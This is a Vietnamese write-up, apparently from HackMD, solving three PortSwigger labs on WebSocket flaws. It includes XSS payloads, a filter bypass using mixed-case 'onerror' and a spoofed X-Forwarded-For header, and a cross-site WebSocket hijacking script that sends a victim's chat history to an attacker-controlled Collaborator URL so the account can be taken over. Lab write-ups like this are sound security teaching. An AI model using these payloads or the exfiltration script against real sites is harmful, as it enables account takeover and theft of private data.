---
title: 'Web10: WebSockets security vulnerabilities'
tags: [web10]

---

# **1. Lab: Manipulating WebSocket messages to exploit vulnerabilities**
>This online shop has a live chat feature implemented using [WebSockets](https://portswigger.net/web-security/websockets).
Chat messages that you submit are viewed by a support agent in real time.
To solve the lab, use a WebSocket message to trigger an `alert()` popup in the support agent's browser.
>![image](https://hackmd.io/_uploads/H1BWZwLUA.png)

>Truy cập bài lab, ta thấy có 1 chức năng **Live chat**, không cần đăng nhập mà ta vẫn có thể chat với mọi người: ![image](https://hackmd.io/_uploads/BJjk-vU8A.png)

>Có thể thấy được các message được truyền qua WebSocket: ![image](https://hackmd.io/_uploads/Sk5obwLL0.png)

>Kiểm tra source `chat.js` ta thấy các message được render thông qua **innerHTML** và không có bất kì cơ chế validate message nào. Ta có thể nghĩ ngay nó khả năng bị dính lỗ hổng DOM XSS: ![image](https://hackmd.io/_uploads/B14NXvL8A.png)

>Kiếm tra cách mà trang web render message: ![image](https://hackmd.io/_uploads/ryl_Xw8U0.png)

>Gửi message với XSS payload để test: `<img src=1 onerror=alert(1)>`: ![image](https://hackmd.io/_uploads/HJmv4DLIA.png)

>Lúc này, ta đã XSS thành công: ![image](https://hackmd.io/_uploads/SJ7YEDL8A.png)

> Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/rkgcNDUU0.png)

# **2. Lab: Manipulating the WebSocket handshake to exploit vulnerabilities**
>This online shop has a live chat feature implemented using [WebSockets](https://portswigger.net/web-security/websockets).
It has an aggressive but flawed XSS filter.
To solve the lab, use a WebSocket message to trigger an `alert()` popup in the support agent's browser
![image](https://hackmd.io/_uploads/HyLpVDI8A.png)

>Thử send message bằng payload ở lab 1:  `<img src=1 onerror=alert(1)>`, thì lần này server đã validate tin nhắn, và chặn luôn IP mình: 
>![image](https://hackmd.io/_uploads/SJLawDL80.png)
>![image](https://hackmd.io/_uploads/B1zjvDU8C.png)

>Ta sẽ thao tác lại các bước bắt tay giữa client-server để giao tiếp như các bước sau:
> * Reconnect: ![image](https://hackmd.io/_uploads/S156dwL8R.png)
> * Thêm header `X-Forwarded-For: 127.0.0.1` để bypass IP block.: ![image](https://hackmd.io/_uploads/rJteYPLL0.png)
> * Kết nối lại thành công: ![image](https://hackmd.io/_uploads/HJ_XKD8LC.png)

>Từ đó, ta sẽ thử lần lượt các payload để XSS, mỗi khi bị block IP thì lại lặp lại thao tác bypass. Cho tới khi thử tới payload: `<img src=1 oNeRrOr=alert`1`>` thì server không còn validate nó nữa: ![image](https://hackmd.io/_uploads/r1OhFPIIC.png)

>Trigger thành công XSS và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/HyHlcDILC.png)

# **3. Lab: Cross-site WebSocket hijacking**
>This online shop has a live chat feature implemented using [WebSockets](https://portswigger.net/web-security/websockets).
To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a [cross-site WebSocket hijacking attack](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) to exfiltrate the victim's chat history, then use this gain access to their account.
![image](https://hackmd.io/_uploads/Hkt3xu8IR.png)

>Mỗi session live chat sẽ được lưu lịch sử dựa vào session cookie: 
>![image](https://hackmd.io/_uploads/rkE6MOL8R.png)

>Chat thử nội dung bất kì và thoát ra. Quay lại đoạn chat ta sẽ thấy history sẽ được load: ![image](https://hackmd.io/_uploads/Hynl7dIU0.png)

>Bây giờ ta sẽ tiến hành thực hiện CSWSH(Cross-site WebSocket hijacking) để lừa nạn nhân khiến nó gửi history đoạn chat về domain của mình controll.

>Khi bắt đầu hay quay lại live chat, client sẽ gửi server `READY`.
>![image](https://hackmd.io/_uploads/SJfwXdIIA.png)

>Ta sẽ viết payload thực hiện gửi `READY` đến web socket url trước rồi khi nó load tin nhắn thì tận dụng sự kiện `onmessage` để trả tất cả message về Collaborator.
```
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

>Lưu payload vào exploit-server: ![image](https://hackmd.io/_uploads/H1Z0Q_LUC.png)

>Thử **View exploit** ta thấy lịch sử chat của mình đã được gửi về Collaborator => Attack thành công.
>![image](https://hackmd.io/_uploads/HkypEu8LA.png)

>**Deliver exploit to victim** và ta nhận được lịch sử chat của nạn nhân. Tìm được message chứa mật khẩu của của `carlos`: ![image](https://hackmd.io/_uploads/BkogruI8C.png)

>Có được mật khẩu, tiến hành đăng nhập thành công vào tài khoản `carlos:nj5gi94ow6854x6btmmv` và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/S1jmHu88C.png)
